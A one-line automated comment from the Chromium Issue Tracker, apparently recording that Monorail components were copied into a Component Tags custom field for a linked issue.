[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094304)*
